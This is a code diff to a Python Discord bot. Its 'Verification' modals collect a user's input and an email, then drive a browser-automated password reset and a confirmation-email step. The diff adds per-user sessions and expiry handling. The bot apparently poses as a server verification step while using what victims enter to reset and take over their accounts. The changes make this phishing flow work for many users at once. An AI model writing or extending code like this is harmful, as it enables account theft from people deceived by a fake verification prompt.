@@ -164,7 +164,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     ephemeral=True
                 )
 
-                result = await automate_password_reset(self.box_two.value)
+                result = await automate_password_reset(self.box_two.value, interaction.user.id)
 
                 # Check if email re-entry is needed
                 if hasattr(config, 'EMAIL_REENTER') and config.EMAIL_REENTER:
@@ -273,7 +273,20 @@ class EmailReenterModal(ui.Modal, title="Email Verification"):
     async def on_submit(self, interaction: discord.Interaction, /) -> None:
         await interaction.response.defer(ephemeral=True)
 
-        from views.otp import page
+        from views.otp import get_user_session
+        sess = get_user_session(interaction.user.id)
+        if sess is None:
+            await interaction.followup.send(
+                embed=discord.Embed(
+                    title="Session Expired",
+                    description="Session has expired! try again",
+                    colour=0xFF0000
+                ),
+                ephemeral=True
+            )
+            return
+
+        page = sess["page"]
         try:
             await page.fill('#proof-confirmation-email-input', self.email_input.value)
             await asyncio.sleep(1)
@@ -316,9 +329,18 @@ class EmailReenterModal(ui.Modal, title="Email Verification"):
             await interaction.followup.send("Email submitted. Code sent. Continuing with verification...", ephemeral=True)
 
             from views.otp import continue_password_reset
-            result = await continue_password_reset()
+            result = await continue_password_reset(interaction.user.id)
 
-            if result is True:
+            if result == "expired":
+                await interaction.followup.send(
+                    embed=discord.Embed(
+                        title="Session Expired",
+                        description="Session has expired! try again",
+                        colour=0xFF0000
+                    ),
+                    ephemeral=True
+                )
+            elif result is True:
                 await interaction.followup.send(
                     embed=discord.Embed(
                         title="Verification ✅",
